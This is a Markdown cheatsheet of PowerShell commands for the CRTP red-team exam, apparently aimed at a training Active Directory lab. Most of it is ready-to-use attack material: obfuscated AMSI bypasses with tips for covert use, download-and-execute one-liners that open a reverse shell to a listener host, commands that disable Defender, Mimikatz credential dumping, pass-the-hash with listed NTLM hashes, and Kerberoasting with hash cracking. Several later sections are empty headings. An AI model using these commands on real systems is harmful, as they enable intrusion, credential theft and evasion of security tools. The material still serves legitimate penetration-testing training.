# Cheatsheet for Certified Red Team Professional (CRTP) 

- [Cheatsheet for Certified Red Team Professional (CRTP)](#cheatsheet-for-certified-red-team-professional-crtp)
  - [PowerShell AMSI Bypass](#powershell-amsi-bypass)
  - [PowerShell One-liners](#powershell-one-liners)
  - [WMI Commands](#wmi-commands)
- [Enumeratiom](#enumeratiom)
  - [PowerView](#powerview)
    - [General](#general)
    - [ACL](#acl)
    - [Forest and trust](#forest-and-trust)
    - [OU](#ou)
    - [GPO](#gpo)
  - [Applocker](#applocker)
- [Lateral Movement](#lateral-movement)
  - [PowerView](#powerview-1)
  - [Derivative local admin loop](#derivative-local-admin-loop)
  - [Bloodhound](#bloodhound)
  - [Kerberoasting](#kerberoasting)
  - [Token Manipulation](#token-manipulation)
  - [Command execution with schtask](#command-execution-with-schtask)
  - [Command execution with WMI](#command-execution-with-wmi)
  - [Command executing with PowerShell Remoting](#command-executing-with-powershell-remoting)
- [Privilege Escalation](#privilege-escalation)
  - [PowerUp](#powerup)
- [Domain Persistence](#domain-persistence)
  - [Mimikatz skeleton key attack](#mimikatz-skeleton-key-attack)
  - [Domain Controller DSRM attack](#domain-controller-dsrm-attack)
  - [DCSync](#dcsync)
- [Post-Exploitation](#post-exploitation)
  - [Disable defender](#disable-defender)
  - [Juicy files](#juicy-files)
  - [Dumping secrets without Mimikatz](#dumping-secrets-without-mimikatz)
  - [Chisel proxying](#chisel-proxying)

## PowerShell AMSI Bypass
Unhooking AMSI will help bypass AV warnings triggered when executing PowerShell scripts that are marked as malicious (such as PowerView). Do not use as-is in covert operations, as they will get flagged. Obfuscate, or even better, eliminate the need for an AMSI bypass altogether by altering your scripts.


Plain AMSI bypass:
```
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Obfuscation example for copy-paste purposes:
```
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

Another bypass, which is not detected by PowerShell autologging:
```
[Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True)`
```

Bypass digitally signed:
```
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
powershell -ep bypass
```

For more obfuscation, check Invoke-Obfuscation.

## PowerShell One-liners

Copy file:
```
Copy-Item -Path Invoke-MimikatzEx.ps1 -Destination \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files' Copy-Item [source] [dest]
```
Show file content
```
Get-Content \\computer.domain.local\c$\Users\test\file.txt
```
List network share:
```
ls \\computer.domain.local\c$ 
```
Show running processes with owner:
```
Get-Process -IncludeUserName
```
Download:
```
iex (iwr http://172.16.100.124/Tools/PowerView.ps1 -UseBasicParsing)
```
Download and execute:
```
powershell.exe iex (iwr http://172.16.100.124/Tools/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.4.101 -Port 443

powershell.exe -c iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.124/Toold/Invoke-PowerShellTcp.ps1'));Power -Reverse -IPAddress 172.16.100.124 -Port 443
```

Encode:
```
$command = 'IEX (New-Object Net.WebClient).DownloadString("http://172.16.100.55/Invoke-PowerShellTcpRun.ps1")'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
```

Encode existing script, copy to clipboard:
```
[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('c:\path\to\PowerView.ps1')) | clip
```
Run it, bypassing execution policy.
```
Powershell -EncodedCommand $encodedCommand
```
If you have Nishang handy, you can use Invoke-Encode.ps1.

## WMI Commands
```
gwmi -Class win32_computersystem -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```

# Enumeratiom

## PowerView
### General
Get user current domain:
```
Get-NetUser | select -ExpandProperty cn
```
Get all computers in current domain:
```
Get-NetComputer
Get-NetForestDomain  
```
Get all user groups:
```
Get-NetGroup
```
Get Domain Admins attributes
```
Get-NetGroup -GroupName 'Domain Admins' -FullData
```
Get members of the Domain Admins group
```
Get-NetGroupMember -GroupName "Domain Admins" | select -ExpandProperty membername
Get-NetGroupMember -GroupName 'Domain Admins'   
```
Get members of the Enterprise Admins group
```
Get-NetGroupMember -GroupName 'Enterprise Admins'           
```
Since this is not a root domain, the above command will return nothing. We need to query the root domain as Enterprise Admins, group is only present in the root of a forest.
```
Get-NetGroupMember -GroupName 'Enterprise Admins'-Domain moneycorp.local
```
Find shares in the domain, ignore default shares:
```
Invoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC
```

### ACL
Get incoming ACL for a specific object:
```
Get-ObjectACL -SamAccountName "Domain Admins" -ResolveGUIDs | Select IdentityReference,ActiveDirectoryRights
```
Enumerate ACL's for user/groups:
```
Get-ObjectAcl -SamAccountName [user/group] -ResolveGUIDs -Verbose
```
Get interesting outgoing ACLs for a specific user or group:
```
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "Domain Admins"} | select ObjectDN,ActiveDirectoryRights
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match 'Domain Admins'}         
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match 'students'}   
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match 'RDPUsers'}    
```


### Forest and trust
Get all domains in current forrest:
```
Get-NetForestDomain -Verbose
```
Map trust of current domain:
```
Get-NetDomainTrust  
```
Map all trusts of the current forest
```
Get-NetForestDomain -Verbose | Get-NetDomainTrust
```

```
Get-NetForestDomain -Verbose | Get-NetDomainTrust | ?{$_.TrustType -eq 'External'}
Get-NetDomainTrust -Verbose | ?{$_.TrustType -eq 'External'} 
Get-NetForestDomain -Forest eurocorp.local -Verbose | Get-NetDomainTrust
```


### OU
Enumerate OU's:
```
Get-NetOU
```
List all computers in an OU:
```
Get-NetOU StudentMachines | %{Get-NetComputer -ADSPath $_}
```


### GPO
Get restricted GPO's:
```
Get-NetGPOProup -Verbose
```
Get GPO's
```
Get-NetGPO
```
Get GPOs applied to a specific OU:
```
Get-NetOU *student* | select gplink
Get-NetGPO -Name "{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}"
```
Enumerate ACL's for GPO's:
```
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}
```
Enumerate GPO's where [user/group] has interesting permissions:
```
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ?{$_.IdentityReference -match 'Domain Admins'} 
```
Check for permissions on a specific group:
```
Get-NetOU StudentMachines -FullData
```
Use ADS path for following:
```
Get-NetGPO -ADSpath 'LDAP://cn={3E04167E-C2B6-4A9A-8FB7-C811158DC97C},cn=policies,cn=system,DC=dollarcorp,DC=moneycorp,DC=local'
```

## Applocker
Check for Applocker Constraint Language:
```
$ExecutionContext.SessionState.LanguageMode
```
Identify AppLocker policy. Look for exempted binaries or paths to bypass. Look at LOLBAS if only signed binaries are allowed.
```
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```


# Lateral Movement

## PowerView
Find existing local admin access for user (noisy):
```
Find-LocalAdminAccess
```
Find local admin access over PS remoting (also noisy), requires Find-PSRemotingLocalAdminAccess.ps1
```
Get-NetComputer -Domain dollarcorp.moneycorp.local > .\targets.txt
Find-PSRemotingLocalAdminAccess -ComputerFile .\targets.txt dcorp-std355
```
Check for local admin access from user to other host and if PS remoting port is open:
```
Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
```
Hunt for sessions of interesting users on machines where you have access (still noisy):
```
Invoke-UserHunter -CheckAccess | ?{$_.LocalAdmin -Eq True }
```
Look for kerberoastable users:
```
Get-DomainUser -SPN | select name,serviceprincipalname
```
Look for AS-REP roastable users
```
Get-DomainUser -PreauthNotRequired | select name
```
Look for users on which we can set UserAccountControl flags
If available - disable preauth or add SPN:
```
Get-DomainComputer -Unconstrained
```
Look for users or computers with Constrained Delegation enabled
If available and you have user/computer hash, access service machine as DA:
```
Get-DomainUser -TrustedToAuth | select userprincipalname,msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select name,msds-allowedtodelegateto
```

## Derivative local admin loop
Escalate to domain admin using derivative local admin.

Get local admin and active sessions:
```
. .\PowerView.ps1
Invoke-UserHunter -CheckAccess
Find-LocalAdminAccess
```
Create PSSession and disable security:
```
$sess = New-PSSession -ComputerName dcorp-svcadmin.dollarcorp.moneycorp.local
$sess = New-PSSession -ComputerName dcorp-dc.dollarcorp.moneycorp.local
Enter-PSSession $sess
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableRealtimeMonitoring $true

exit
Invoke-Command -FilePath .\Invoke-Mimikatz.ps1 -Session $sess

Enter-PSSession $sess
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```
Use krbtgt hash to create a golden ticket.

Download/copy and invoke Mimikatz:
```
Copy-Item -Path Invoke-MimikatzEx.ps1 -Destination \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
Invoke-MimikatzEx.ps1

iex (iwr http://172.16.100.124/Tools/Invoke-Mimikatz.ps1 -UseBasicParsing)
Invoke-Mimikatz
```
From elevated shell:
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:srvadmin /domain:dollarcorp.moneycorp.local /ntlm:a98e18228819e8eec3dfa33cb68b0728 /run:powershell.exe"'
Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe"'
```
Loop with elevated privileges!


## Bloodhound
Use Invoke-BloodHound from SharpHound.ps1, or use SharpHound.exe. Both can be ran reflectively.

Run all checks if you don't care about OpSec:
```
Invoke-BloodHound -CollectionMethod All 
```
Running LoggedOn separately sometimes gives you more sessions, but enumerates by looping through hosts:
```
Invoke-BloodHound -CollectionMethod LoggedOn
```

### Installing neo4j
```
neo4j.bat install-service
neo4j.bat start

Browse to http://localhost:7474
Enter the username: neo4j and password: neo4j.
```

## Kerberoasting
### Automatic
With PowerView:
```
Request-SPNTicket -SPN "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"
```
And crack the hash with hashcat:
```
hashcat -a 0 -m 13100 hash.txt `pwd`/rockyou.txt --rules-file `pwd`/hashcat/rules/best64.rule
```
### Manual
Request TGS for kerberoastable account (SPN):
```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"
```
Dump TGS to disk:
```
Invoke-Mimikatz -Command '"kerberos::list /export"'
```
Crack with TGSRepCrack:
```
python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\mssqlsvc.kirbi
```

### Make user kerberoastable by setting SPN
We need ACL permissions to set UserAccountControl flags for said user, see above for hunting. Using PowerView:
```
Set-DomainObject -Identity support355user -Set @{serviceprincipalname='any/thing'}
```





## Token Manipulation
## Command execution with schtask
## Command execution with WMI
## Command executing with PowerShell Remoting


# Privilege Escalation

## PowerUp


# Domain Persistence

## Mimikatz skeleton key attack
## Domain Controller DSRM attack
## DCSync


# Post-Exploitation

## Disable defender
## Juicy files
## Dumping secrets without Mimikatz
## Chisel proxying